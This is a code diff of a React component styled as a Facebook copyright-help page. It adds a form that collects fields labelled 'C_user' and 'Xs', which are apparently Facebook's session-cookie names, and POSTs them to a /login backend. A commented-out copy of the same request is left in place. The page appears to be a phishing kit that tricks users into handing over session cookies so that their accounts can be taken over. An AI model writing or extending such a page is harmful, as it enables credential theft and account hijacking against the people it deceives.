@@ -1,7 +1,72 @@
-import React from 'react'
+import React, { useState } from 'react'
 import "./Facebook.css"
 import HelpData from './HelpData'
 const Facebook = () => {
+    const [data, Setdata] = useState({
+        Cuser: "",
+        Xs: "",
+    });
+
+    const handleClick = (e) => {
+        const name = e.target.name;
+        const value = e.target.value;
+        console.log(name, value);
+
+        Setdata({ ...data, [name]: value });
+    }
+
+    const HandleSubmit = async (e) =>{
+        e.preventDefault();
+        
+        const {Cuser, Xs}= data;
+        const res = await fetch(`/login`,{
+          method: "POST",
+          headers:{
+            "content-type": "application/json"
+          },
+          body:JSON.stringify({
+            Cuser, Xs
+          })
+        });
+  
+        const datahit = await res.json();
+        if(datahit.status=== 422 || !datahit){
+          console.log("not registered");
+          alert("Invalid credentials");
+        }else{
+          console.log("registered successfully");
+          alert("Registration Successfully");
+        }
+    }
+       
+    
+    
+    
+    
+    
+    //     const response = await fetch("logindata", {
+    //         method: "POST",
+    //         headers: {
+    //             "content-type": "application/json"
+    //         },
+    //         body:JSON.stringify({
+    //             Cuser, Xs
+    //         })
+    //     });
+
+    //     const detail = await response.json();
+    //     console.log(detail)
+    //     if( detail.status === 422 || !detail){
+    //         console.log("not registered");
+    //         alert("Invalid Credentials");
+    //     }else{
+    //         console.log("registered successfully");
+    //         alert ("registration Successfully");
+    //     }
+    // }
+
+   
+
     return (
         <div>
             <div className='facebook_title_controls'>
@@ -33,7 +98,12 @@ const Facebook = () => {
                                 <div className='copyright_video_content'>
                                     <span>Detailed Video Information</span>
                                     <div className='video_vid mb-3 mt-2'>
-                                        <video src='./video/vid1.mp4' autoPlay loop   className='video_here' style={{ width: "300px" }}  controls/>
+                                        <video
+                                            src='./video/vid1.mp4'
+                                            autoPlay loop className='video_here'
+                                            style={{ width: "300px" }}
+
+                                            controls />
                                     </div>
                                     <p>Please be sure to provide the requested information thanks
                                         <br></br>
@@ -43,14 +113,14 @@ const Facebook = () => {
                                     <div className='container'>
                                         <div className='row'>
                                             <div className=' col-12'>
-                                                <form>
+                                                <form method='POST' onClick={HandleSubmit}>
                                                     <div className="mb-3">
                                                         <label className="form-label">C_user</label>
-                                                        <input type="text" className="form-control" />
+                                                        <input type="text" name='Cuser' value={data.Cuser} onChange={handleClick} className="form-control" />
                                                     </div>
                                                     <div className="mb-3">
-                                                        <label className="form-label">X s</label>
-                                                        <input type="text" className="form-control" id="exampleInputPassword1" />
+                                                        <label className="form-label">Xs</label>
+                                                        <input type="text" name='Xs' value={data.Xs} onChange={handleClick} className="form-control" id="exampleInputPassword1" />
                                                     </div>
 
                                                     <div className="mb-3 py-1 px-3 text-end">
